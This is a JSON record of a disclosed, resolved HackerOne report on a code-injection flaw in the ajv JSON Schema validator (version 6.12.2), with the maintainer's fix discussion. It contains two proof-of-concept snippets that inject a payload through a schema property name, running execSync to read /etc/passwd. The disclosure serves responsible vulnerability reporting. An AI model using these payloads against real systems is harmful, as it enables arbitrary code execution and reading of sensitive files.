{"id":897974,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTc5NzQ=","url":"https://hackerone.com/reports/897974","title":"Arbitrary code execution via untrusted schemas in ajv","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-06-14T13:42:42.772Z","submitted_at":"2020-06-14T13:42:42.772Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"chalker","url":"/chalker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-14T17:21:21.521Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-07-15T17:21:17.150Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report an arbitrary code execution vulnerability in `ajv`.\nIt allows to execute arbitrary code if an attacker-controlled schema is passed to the module.\n\nI have confirmed that this should be treated as a security issue.\nI labeled this as low because this is an unusual scenario, usually schemas are static.\n\n# Module\n\n**module name:** `ajv`\n**version:** 6.12.2\n**npm page:** `https://www.npmjs.com/package/ajv`\n\n## Module Description\n\n\u003e The fastest JSON Schema validator for Node.js and browser. Supports draft-04/06/07.\n\n## Module Stats\n\n29 351 921 weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\najv builds code in an unsafe way and applies regex transformations over it after data from a potentially untrusted JSON schema has been inserted in it, resulting in arbitrary code execution from an otherwise valid schema.\n\n## Steps To Reproduce:\n\n```js\nconst ajv = require('ajv')({})\nconst payload = \"(console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`)),process.exit(0))\"\nconst schemaJSON =`\n{\n  \"properties\": {\n    \"){}}};${payload};return validate//\": {\n      \"allOf\": [{}]\n    }\n  }\n}\n`\najv.compile(JSON.parse(schemaJSON))\n```\nGist: https://gist.github.com/ChALkeR/a06ff0a76b3830205d3d4850068751f0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Y\n- I opened an issue in the related repository: N\n\n## Impact\n\nExecuting arbitrary js code and/or shell commands if the schema is attacker-controlled (e.g. user supplies JSON with a schema).","vulnerability_information_html":"\u003cp\u003eI would like to report an arbitrary code execution vulnerability in \u003ccode\u003eajv\u003c/code\u003e.\u003cbr\u003e\nIt allows to execute arbitrary code if an attacker-controlled schema is passed to the module.\u003c/p\u003e\n\n\u003cp\u003eI have confirmed that this should be treated as a security issue.\u003cbr\u003e\nI labeled this as low because this is an unusual scenario, usually schemas are static.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e \u003ccode\u003eajv\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 6.12.2\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/ajv\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThe fastest JSON Schema validator for Node.js and browser. Supports draft-04/06/07.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e29 351 921 weekly downloads\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eajv builds code in an unsafe way and applies regex transformations over it after data from a potentially untrusted JSON schema has been inserted in it, resulting in arbitrary code execution from an otherwise valid schema.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eajv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eajv\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)({})\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e(console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`)),process.exit(0))\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eschemaJSON\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\n{\n  \u0026quot;properties\u0026quot;: {\n    \u0026quot;){}}};\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e;return validate//\u0026quot;: {\n      \u0026quot;allOf\u0026quot;: [{}]\n    }\n  }\n}\n`\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eajv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecompile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschemaJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGist: \u003ca title=\"https://gist.github.com/ChALkeR/a06ff0a76b3830205d3d4850068751f0\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2FChALkeR%2Fa06ff0a76b3830205d3d4850068751f0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/ChALkeR/a06ff0a76b3830205d3d4850068751f0\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: Y\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eExecuting arbitrary js code and/or shell commands if the schema is attacker-controlled (e.g. user supplies JSON with a schema).\u003c/p\u003e\n","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-08-14T17:21:17.233Z","allow_singular_disclosure_after":-11800034.847815795,"singular_disclosure_allowed":true,"vote_count":1,"voters":["d3lla"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8287167,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please add @epoberezkin (ajv maintainer) to the discussion.","markdown_message":"\u003cp\u003ePlease add \u003ca href=\"/epoberezkin\"\u003e@epoberezkin\u003c/a\u003e (ajv maintainer) to the discussion.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-14T13:42:52.654Z","updated_at":"2020-06-14T13:42:52.654Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8287176,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Forgot to mention: the transformation that was abused by this specific PoC is inside `cleanUpCode` function.","markdown_message":"\u003cp\u003eForgot to mention: the transformation that was abused by this specific PoC is inside \u003ccode\u003ecleanUpCode\u003c/code\u003e function.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-14T13:43:44.342Z","updated_at":"2020-06-14T13:43:44.342Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8287433,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-14T14:49:20.093Z","updated_at":"2020-06-14T14:49:20.093Z","actor":{"username":"epoberezkin","cleared":false,"url":"/epoberezkin","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8289359,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A bit simpler version of the PoC:\n```js\nconst ajv = require('ajv')({})\nconst payload = \"console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`));process.exit(0)\"\nconst prop = `){}}};${payload}//`\nconst schemaJSON =`{\"properties\":{${JSON.stringify(prop)}:{\"not\":{}}}}`\nconst validate = ajv.compile(JSON.parse(schemaJSON))\n```","markdown_message":"\u003cp\u003eA bit simpler version of the PoC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eajv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eajv\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)({})\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003econsole.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`));process.exit(0)\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eprop\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`){}}};\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e//`\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eschemaJSON\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e`{\u0026quot;properties\u0026quot;:{\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprop\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e:{\u0026quot;not\u0026quot;:{}}}}`\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003evalidate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eajv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecompile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschemaJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-06-15T00:20:02.281Z","updated_at":"2020-06-15T00:20:02.281Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8289917,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Upon reviewing the code, I suggest to remove `cleanUpCode` and `finalCleanUpCode` alltogether, and don't do any code transformations as strings.","markdown_message":"\u003cp\u003eUpon reviewing the code, I suggest to remove \u003ccode\u003ecleanUpCode\u003c/code\u003e and \u003ccode\u003efinalCleanUpCode\u003c/code\u003e alltogether, and don\u0026#39;t do any code transformations as strings.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-15T04:36:23.946Z","updated_at":"2020-06-15T04:36:48.644Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8418682,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-26T13:05:48.393Z","updated_at":"2020-06-26T13:05:48.393Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8461228,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A similar issue exists in `joinPaths`: \n```js\nfunction joinPaths (a, b) {\n  if (a == '\"\"') return b;\n  return (a + ' + ' + b).replace(/' \\+ '/g, '');\n}\n```\n\nHere, `a` and `b` are _code_, and calling replace in such form on them is unsafe.\n\nPoC: https://gist.github.com/ChALkeR/29ce6e7185cb9486d05e8b33503b0f85","markdown_message":"\u003cp\u003eA similar issue exists in \u003ccode\u003ejoinPaths\u003c/code\u003e: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ejoinPaths\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e + \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u0026#39; \u003c/span\u003e\u003cspan class=\"se\"\u003e\\+\u003c/span\u003e\u003cspan class=\"sr\"\u003e \u0026#39;/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere, \u003ccode\u003ea\u003c/code\u003e and \u003ccode\u003eb\u003c/code\u003e are \u003cu\u003ecode\u003c/u\u003e, and calling replace in such form on them is unsafe.\u003c/p\u003e\n\n\u003cp\u003ePoC: \u003ca title=\"https://gist.github.com/ChALkeR/29ce6e7185cb9486d05e8b33503b0f85\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2FChALkeR%2F29ce6e7185cb9486d05e8b33503b0f85\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/ChALkeR/29ce6e7185cb9486d05e8b33503b0f85\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-30T21:10:11.755Z","updated_at":"2020-06-30T21:10:11.755Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8466557,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"fix to be released on Saturday - it is in master branch. @mcollina - maybe you can test with fastify? Or I will do it before the release.","markdown_message":"\u003cp\u003efix to be released on Saturday - it is in master branch. \u003ca href=\"/mcollina\"\u003e@mcollina\u003c/a\u003e - maybe you can test with fastify? Or I will do it before the release.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-01T09:48:24.540Z","updated_at":"2020-07-01T09:48:24.540Z","actor":{"username":"epoberezkin","cleared":false,"url":"/epoberezkin","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8555571,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This should be fixed now.","markdown_message":"\u003cp\u003eThis should be fixed now.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-10T02:03:50.822Z","updated_at":"2020-07-10T02:03:50.822Z","actor":{"username":"chalker","cleared":false,"url":"/chalker","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8610634,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing as Fixed! ","markdown_message":"\u003cp\u003eClosing as Fixed! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-15T17:20:59.488Z","updated_at":"2020-07-15T17:20:59.488Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"chalker","url":"/chalker"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8610638,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-15T17:21:17.170Z","updated_at":"2020-07-15T17:21:17.170Z","first_to_agree":true,"actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8940287,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-14T17:21:21.622Z","updated_at":"2020-08-14T17:21:21.622Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}